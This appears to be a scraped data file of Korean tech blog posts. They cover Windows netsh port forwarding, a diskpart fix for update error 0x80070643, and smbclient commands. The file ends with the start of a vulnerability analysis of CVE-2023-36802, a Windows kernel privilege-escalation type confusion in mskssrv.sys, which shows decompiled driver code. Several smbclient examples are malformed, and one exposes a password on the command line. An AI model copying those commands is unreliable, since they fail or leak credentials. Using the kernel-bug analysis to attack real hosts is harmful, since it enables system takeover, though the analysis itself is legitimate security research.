[]).push({});\n</script>\n\n가상 머신에서 \"Windows 키 + R\"을 눌러 명령 프롬프트를 열고, 실행 대화상자에 \"cmd\"를 입력하여 실행하세요. 다음 명령어를 입력하여 NAT 규칙을 생성하세요:\n\n```plaintext\nnetsh interface portproxy add v4tov4 listenport=80 listenaddress=0.0.0.0 connectport=8080 connectaddress=192.168.1.10\n```\n\n포워딩할 포트 번호로 \"80\"을, 포트를 전달할 장치의 IP 주소로 \"192.168.1.10\"을 대체하세요.\n\n## 단계 9: NAT 규칙 확인\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n다음 명령을 입력하여 NAT 규칙을 확인하세요:\n\nnetsh interface portproxy show all\n\n모든 NAT 규칙을 나열해줄 것입니다.\n\n# 윈도우에서 Netsh 포트 포워딩 규칙 관리\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n윈도우에서 Netsh 포트 포워딩 규칙을 관리하는 단계별 가이드입니다:\n\n## 단계 1: 명령 프롬프트 열기\n\n시작 메뉴를 클릭하고 검색 필드에 \"cmd\"를 입력한 다음 \"명령 프롬프트\"를 선택하세요.\n\n## 단계 2: 기존 포트 포워딩 규칙 확인\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n\"netsh interface portproxy show all\"을 입력하고 Enter 키를 누르세요. 이렇게 하면 현재 모든 포트 포워딩 규칙 목록이 표시됩니다.\n\n## 단계 3: 포트 포워딩 규칙 추가\n\n새 포트 포워딩 규칙을 추가하려면 다음을 입력하세요:\n\n\"netsh interface portproxy add v4tov4 listenport= listenaddress= connectport= connectaddress=\"\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n## 단계 4: 포트 포워딩 규칙 삭제\n\n기존의 포트 포워딩 규칙을 삭제하려면 다음을 입력하세요:\n\n`netsh interface portproxy delete v4tov4 listenport= listenaddress=`\n\n## 단계 5: 기존의 포트 포워딩 규칙 수정\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n기존 포트 포워딩 규칙을 수정하려면 해당 규칙을 삭제하고 원하는 변경 사항이 적용된 새로운 규칙을 추가하면 됩니다.\n\n## 단계 6: 포트 포워딩 규칙 비활성화\n\n기존 포트 포워딩 규칙을 비활성화하려면 다음을 입력하세요:\n\n“netsh interface portproxy delete v4tov4 listenport= listenaddress=”\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n## 단계 7: 비활성화된 포트 포워딩 규칙 활성화\n\n비활성화된 포트 포워딩 규칙을 활성화하려면 다음을 입력하여 규칙을 다시 추가하세요:\n\n“netsh interface portproxy add v4tov4 listenport= listenaddress= connectport= connectaddress=”\n\n# 결론\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n- 포트 포워딩은 네트워킹 기술로, 방화벽이나 라우터를 통해 공용 네트워크에서 사설 네트워크로 트래픽을 전달하는 것을 가능하게 합니다. 이 기술을 사용하면 가정 네트워크에 원격으로 접속하여 서버를 호스팅할 수 있습니다.\n- 포트 포워딩은 공용 IP 주소를 각 사설 네트워크 장치에 할당하여, 방화벽에서 차단되는 대신 특정 장치로 들어오는 트래픽을 직접 전달합니다.\n- Windows 운영 체제에는 포트 포워딩 설정을 구성할 수 있는 내장 도구가 포함되어 있습니다. Windows 방화벽과 인터넷 연결 공유(ICS) 기능 등이 이에 해당합니다. 이러한 도구를 사용하면 포트 포워딩 및 수신 트래픽을 받아들일 장치나 응용 프로그램을 명시하는 규칙을 만들 수 있습니다.\n\n#Price를 위한 더 많은 도구가 있습니다\n\nhttps://t.me/redfishiaven\n\n#업데이트 #튜토리얼 #리아뉴스 #소프트웨어 #하드웨어 #기술 #돈 #수익 #IPMC #사랑 #이벤트 #컴퓨팅 #컴퓨터 #정보기술 #학습 #인공지능 #redfishiaven #서버 #딥웹 #다크웹 #비트코인\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n구글 맵스에서 REDFISH IA VEN (https://goo.gl/maps/LVKkEYNN2LTe9C34A)을 확인해보세요.\n\nhttps://www.youtube.com/channel/UC6k_cFigPCSEtRyALo1D-tA\n\n새로운 소프트웨어에 대한 최초 정보를 받아보세요! #software\n","ogImage":{"url":"/assets/img/2024-05-23-PortForwardinginWindowsandWaystoSetitUp_0.png"},"coverImage":"/assets/img/2024-05-23-PortForwardinginWindowsandWaystoSetitUp_0.png","tag":["Tech"],"readingTime":13},{"title":"윈도우 서버 2022에 KB5034439을 설치하려고 할 때 발생하는 0x80070643 오류 해결 방법","description":"","date":"2024-05-23 15:25","slug":"2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022","content":"\n안녕하세요, 지난주 발생한 문제에 대해 이야기하려고 해요.\n\nWindows Server 2022에서 Windows 업데이트를 확인했을 때 다음과 같은 오류가 있었어요:\n\n![에러 이미지](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_0.png)\n\n그리고 KB5034439를 설치하는 동안 오류가 발생했음을 확인했는데, 해결해야 할 여러 제안이 있었지만 문제를 해결하지 못했어요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n그리고 마침내 그 문제를 해결할 수 있는 올바른 참조를 찾았어요. 이제 아래 단계를 따라주세요.\n\n# 복구 파티션을 수동으로 크기 조정하기\n\n- 관리자 권한으로 명령 프롬프트 창(cmd)을 엽니다.\n\n![이미지](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_1.png)\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n2. WinRE가 설치된 경우, WinRE 디렉토리 경로가 있는 \"Windows RE 위치\"가 있어야 합니다. WinRE 상태를 확인하려면 reagentc /info를 실행하세요. 예시: \"Windows RE 위치:\n\n\\\\?\\GLOBALROOT\\device\\harddisk0\\partition4\\Recovery\\WindowsRE\n\n![이미지](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_2.png)\n\n3. WinRE 비활성화를 위해 reagentc /disable를 실행하세요\"\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n![Error Screenshot](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_3.png)\n\n4. Shrink the OS partition and prepare the disk for a new recovery partition.\n   a. To shrink the OS, run diskpart\n\n![Error Screenshot](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_4.png)\n\nb. Run list disk\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n![Error message](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_5.png)\n\nc. To select the OS disk, run `sel disk OS disk index`. This should be the same disk index as WinRE.\n\n![Error message](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_6.png)\n\nd. To check the partition under the OS disk and find the OS partition, run `list part`\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n![Error Image 1](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_7.png)\n\ne. To select the OS partition, run `sel part OS partition index`\n\n![Error Image 2](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_8.png)\n\nf. Run `shrink desired=250 minimum=250`\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n![Error Screenshot 9](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_9.png)\n\ng. To select the WinRE partition, run `sel part WinRE partition index`\n\n![Error Screenshot 10](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_10.png)\n\nh. To delete the WinRE partition, run `delete partition override`\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n![이미지](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_11.png)\n\n5. 새 복구 파티션을 생성합니다.\n\na. 먼저, 디스크 파티션 스타일이 GUID Partition Table (GPT) 또는 Master Boot Record (MBR)인지 확인합니다. 이를 확인하려면 list disk를 실행합니다. \"Gpt\" 열에 별표(_)가 있는지 확인합니다. 별표(_)가 있는 경우 드라이브가 GPT이고, 그렇지 않으면 MBR입니다.\n\n![이미지](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_12.png)\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n1. GPT 디스크인 경우, create partition primary id=de94bba4-06d1-4d40-a16a-bfd50179d6ac 명령을 실행한 다음 gpt attributes =0x8000000000000001 명령을 실행하세요.\n\n![image](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_13.png)\n\n2. MBR 디스크인 경우, create partition primary id=27 명령을 실행하세요.\n\n3. 파티션을 포맷하려면, format quick fs=ntfs label=\"Windows RE tools\" 명령을 실행하세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<img src=\"/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_14.png\" />\n\n6. To confirm that the WinRE partition is created, run `list vol`\n\n<img src=\"/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_15.png\" />\n\n7. To exit from diskpart, run `exit`\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n![Error Image 1](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_16.png)\n\n8. To re-enable WinRE, run `reagentc /enable`\n\n![Error Image 2](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_17.png)\n\n9. To confirm where WinRE is installed, run `reagentc /info`\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<img src=\"/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_18.png\" />\n\n알겠어요, 프로세스가 완료되었습니다. 이제 Windows 업데이트를 다시 실행하고 성공했는지 확인해보세요.\n\n<img src=\"/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_19.png\" />\n\n이게 도움이 되기를 바라며, 행운을 빕니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n참고문헌:\n","ogImage":{"url":"/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_0.png"},"coverImage":"/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_0.png","tag":["Tech"],"readingTime":8},{"title":"Smbclient 명령어","description":"","date":"2024-05-23 15:23","slug":"2024-05-23-Smbclientcommand","content":"\n샘바 파일 서버에 연결하는 두 가지 다른 방법이 있습니다. 아래와 같습니다:\n\n터미널에서 smbclient 명령어를 사용하여 연결\n\" smb://filename \" 형식의 주소를 입력하여 파일 시스템에서 연결\n이 기사에서는 터미널에서 삼바 파일 서버에 연결하고 드라이브 트랜잭션을 수행하는 방법을 살펴보겠습니다. 시작해 봅시다 :)\n\nSmbclient은 FTP 연결과 유사한 명령 줄 도구입니다. 이 명령은 SMB 리소스에 액세스를 제공합니다. 일반적인 smbclient 명령어는 다음과 같습니다:\n\nSMB 공유 목록 열기:\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\nsmbclient - L; //server_name -U users\n```\n\nSMB 공유: (비밀번호를 입력해야 함.)\n\n```js\nsmclient; //server/share -U user\n```\n\nSMB 공유에 직접 연결: (비밀번호 필요 없음, 하지만 비밀번호가 화면에 표시됨.)\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\nsmclient; //server/share -U user%password\n```\n\n더 구체적인 용도를 위한 일반적인 smbclient 플래그는 아래에 나열되어 있습니다:\n\n“-L” 플래그 (— list)는 서버의 공유를 나열하는 데 사용되는 플래그입니다.\n\n“-U” 플래그 (— username [%password])는 파일 서버에 로그인할 때 사용할 사용자 이름 (및 선택적으로 암호)를 지정하는 데 사용됩니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n“-a” 플래그 (— authentication-file)는 연결을 설정하기 위한 사용자 비밀번호 정보를 보관하는 파일을 지정하는 데 사용하는 플래그입니다. 지정해야 하는 파일의 형식은 다음과 같아야 합니다.\n\n“-B” 플래그 (— browse): 이 플래그는 DNS를 사용하여 SMB 서버를 찾습니다.\n\n“-p” 플래그 (— port)는 연결할 포트를 선택하는 데 사용됩니다. 이 플래그를 사용하지 않으면 기본 포트는 포트 139입니다.\n\n“-I” 플래그 (— IP-address IP-address)는 연결을 위해 NetBIOS 이름이 아닌 서버의 IP 주소를 제공하는 데 사용됩니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n\"플래그( —— kerberos): Kerberos를 사용하여 인증을 시도하는 데 사용됩니다.\n\n디버그 수준 플래그( —— debuglevel)은 더 자세한 정보를 로그 파일에 제공합니다. 0부터 10까지의 값이 제공될 수 있습니다.\n\n또한, smbclient를 다양한 방법으로 연결할 수 있습니다. 다음과 같습니다:\n\n1. 서버 NetBIOS 이름:\n\n\\`\\`\\`js\nsmbclient -L fileserver\n\\`\\`\\`\"\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n2. 해당 서버의 IP 주소로 다음 명령어를 사용하세요:\n\n```js\nsmbclient -L x.x.x.x\n```\n\n3. 백슬래시를 사용하여 공유에 직접 링크를 하려면 다음과 같이 입력하세요:\n\n```js\nsmbclient \\\\\\\\fileserver\\\\share\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n4. 위의 옵션은 따옴표를 사용하여도 수행할 수 있습니다:\n\n```js\nsmbclient \"\\\\fileserver\\share\"\n```\n","ogImage":{"url":"/assets/img/2024-05-23-Smbclientcommand_0.png"},"coverImage":"/assets/img/2024-05-23-Smbclientcommand_0.png","tag":["Tech"],"readingTime":4},{"title":"N일 연속하여 모든 것을 탈취하는 방법 파트 6 - Windows 커널 LPE SYSTEM 얻기","description":"","date":"2024-05-23 15:21","slug":"2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM","content":"\n![이미지](/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png)\n\n이 블로그 포스트는 저희가 X에서 시연한 1-day 풀 체인 익스플로잇에서 사용된 취약성에 대한 마지막 시리즈입니다. 이 블로그 포스트에서는 VMware의 제한된 권한에서 호스트 컴퓨터의 모든 권한을 얻기 위해 SYSTEM으로 권한 상승하는 방법을 소개할 것입니다. 취약성은 mskssrv.sys 드라이버에서 발생하는 CVE-2023-36802이며, 이는 이번 시리즈의 세 번째 블로그에서 다룬 CVE-2023-29360의 동일한 대상입니다.\n\n이 취약성은 실제로 악용되었으며 여러 위협 인텔리전스 그룹에 의해 감지되었습니다. IBM X-Force의 분석 보고서가 발표되었고 chompie1337의 PoC 코드가 10월에 공개된 가운데, 우리의 위협 인텔리전스 서비스인 Fermium-252는 이 취약성의 PoC와 익스플로잇을 모두 2023년 9월부터 보유하고 있습니다.\n\n# 세 번째 블로그를 상기해 보세요\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n이 취약점의 대상 드라이버는 이 시리즈의 세 번째 블로그와 동일합니다. DeviceIoControl을 통한 통신 프로세스, Ioctl 요청 처리 과정 등과 같이 중복된 내용은 건너뜁니다. 따라서 이 블로그를 시작하기 전에 CVE-2023-29360이 포함된 세 번째 블로그를 읽는 걸 강력히 권장합니다.\n\n세 번째 블로그에 설명된 대로, 사용자는 IoControlCode가 0x2F0408일 때 FSRendezvousServer::PublishTx에 접근할 수 있습니다. 이 함수는 다음과 같습니다.\n\n```js\n__int64 __fastcall FSRendezvousServer::PublishTx(FSRendezvousServer *this, struct _IRP *irp)\n{\n  ...\n  /**\n    입력 버퍼 유효성 검사\n  **/\n\n  FsContext2 = (const struct FSRegObject *)obj->FileObject->FsContext2;\n  // \"FsContext2\"를 FSRendezvousServer 개체 안에서 찾음\n  isfindobj = FSRendezvousServer::FindObject(this, FsContext2);\n  KeReleaseMutex((PRKMUTEX)((char *)this + 8), 0);\n  if (isfindobj)\n  {\n    (*(void(__fastcall **)(const struct FSRegObject *))(*(_QWORD *)FsContext2 + 0x38i64))(FsContext2); // FsStreamReg 잠금\n    // [*]. FSStreamReg::PublishTx 호출\n    result = FSStreamReg::PublishTx(FsContext2, data);\n```\n\n사용자가 제공한 값을 유효성 검사한 후, FSStreamReg::PublishTx가 FsContext2를 첫 번째 인수로 호출됩니다. 즉, FsContext2는 FSStreamReg와 관련된 유형의 개체로 추론할 수 있습니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\nFsContext2 값을 FSStreamReg 개체로 설정하려면 FSRendezvousServer::InitializeStream을 호출해야하며, 이 작업은 IoControlCode가 0x2F0404 일 때에만 호출될 수 있습니다.\n\n```js\n__int64 __fastcall FSRendezvousServer::InitializeStream(FSRendezvousServer *this, struct _IRP *irp)\n{\n  ...\n  // 버퍼 할당\n  buffer = (FSStreamReg *)operator new(0x1D8ui64, (enum _POOL_TYPE)irp, 0x67657253u); // FSStreamReg의 크기는 `0x1D8`입니다\n  if ( buffer )\n    FSStreamReg_obj = (volatile signed __int32 *)FSStreamReg::FSStreamReg(buffer); // FSStreamReg 설정\n  if ( !FSStreamReg_obj )\n    return 0xC000009A;\n  // FSStreamReg 초기화\n  if ( (unsigned int)Feature_Servicing_TeamsUsingMediaFoundationCrashes__private_IsEnabled() )\n    result = FSStreamReg::Initialize((FSStreamReg *)FSStreamRegObj, irp, v11, data, irp->RequestorMode);\n  else\n    result = FSStreamReg::Initialize((FSStreamReg *)FSStreamRegObj, v10, data, irp->RequestorMode);\n\n  ...\n  // FSStreamReg_obj를 FsContext2에 저장\n  obj->FileObject->FsContext2 = (PVOID)FSStreamReg_obj;\n  _InterlockedIncrement(FSStreamReg_obj + 6);\n  ...\n```\n\n# CVE-2023–36802\n\n위에서 언급한 대로, obj-`FileObject-`FsContext2가 FSStreamReg 유형으로 간주되고 있었습니다. 그러나 이 가정이 맞는 것일까요?\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\nFSRendezvousServer::FindObject 함수를 살펴보겠습니다. 이 함수는 FsContext2가 FSRendezvousServer 객체 내에 있는지 확인합니다.\n\n```js\nchar __fastcall FSRendezvousServer::FindObject(FSRendezvousServer *this, __int64 FsContext2)\n{\n  if ( FsContext2 )\n  {\n    if ( *(_DWORD *)(FsContext2 + 0x30) == 1 )\n    {\n      // Type number가 `1`인 경우\n      ...\n      while ( 1 ) // RegObjectList를 검색합니다.\n      {\n        Type1RegObj = *(_QWORD **)(this + 0x90);\n        if ( !Type1RegObj || (_QWORD *)*Type1ListHead == Type1ListHead || Type1RegObj == Type1ListHead )\n          break;\n        if ( Type1RegObj != (_QWORD *)8 && Type1RegObj[3] == FsContext2 ) // FsContext2를 찾았습니다!!!\n          return 1;\n        FSRegObjectList::MoveNext((FSRendezvousServer *)((char *)this + 0x70));\n      }\n    }\n    else\n    {\n      // Type number가 `1`이 아닌 경우\n      ...\n      while ( 1 ) // RegObjectList를 검색합니다.\n      {\n        Type2RegObj = *(_QWORD **)(this + 0x60);\n        if ( !Type2RegObj || (_QWORD *)*Type2ListHead == Type2ListHead || Type2RegObj == Type2ListHead )\n          break;\n        if ( Type2RegObj != (_QWORD *)8 && Type2RegObj[3] == FsContext2 ) // FsContext2를 찾았습니다!!!\n          return 1;\n        FSRegObjectList::MoveNext((FSRendezvousServer *)((char *)this + 0x40));\n      }\n    }\n  }\n  return 0;\n}\n```\n\nFSRendezvousServer::FindObject는 FsContext2의 0x30 오프셋에 위치한 타입 번호에 따라 두 가지 종류의 객체가 있다는 것을 명시적으로 보여줍니다. FSStreamReg::FSStreamReg에서 FSStreamReg 타입의 생성자로부터, FSStreamReg의 타입 번호를 2로 알 수 있습니다.\n\n```js\n__int64 __fastcall FSStreamReg::FSStreamReg(__int64 FSStreamReg)\n{\n  ...\n  *(_QWORD *)FSStreamReg = &FSStreamReg::`vftable';\n  *(_QWORD *)(FSStreamReg + 0x20) = FSStreamReg;\n  *(_DWORD *)(FSStreamReg + 0x30) = 2;        // 타입 == 2\n  *(_DWORD *)(FSStreamReg + 0x34) = 0x1D8;    // 크기 == 0x1D8\n  ...\n  return FSStreamReg;\n}\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\nmskssrv.sys 드라이버를 분석한 후, type number가 1인 FSContextReg 객체를 찾을 수 있었습니다.\n\n```js\n__int64 __fastcall FSRendezvousServer::InitializeContext(FSRendezvousServer *this, struct _IRP *a2)\n{\n  ...\n  FSContextReg = (__int64)operator new(0x78ui64, (enum _POOL_TYPE)a2, 0x67657243u);\n  if ( FSContextReg )\n  {\n    ...\n    *(_QWORD *)FSContextReg = &FSContextReg::`vftable'; // VTable 설정\n    *(_QWORD *)(FSContextReg + 0x20) = FSContextReg;\n    *(_DWORD *)(FSContextReg + 0x30) = 1;    // Type == 1\n    *(_DWORD *)(FSContextReg + 0x34) = 0x78; // Size == 0x78\n    ...\n  }\n  ...\n  obj->FileObject->FsContext2 = (PVOID)FSContextReg;\n  ...\n}\n```\n\nFSContextReg의 크기로부터 (FSContextReg는 0x78바이트, FSStreamReg는 0x1D8바이트) FSContextReg가 FSStreamReg를 상속받지 않는다는 것을 알 수 있습니다. 자식 클래스는 부모 클래스의 모든 필드를 상속받기 때문에, 자식 클래스는 동일하거나 더 큰 크기를 가져야 합니다. 또한, FSRendezvousServer::FindObject 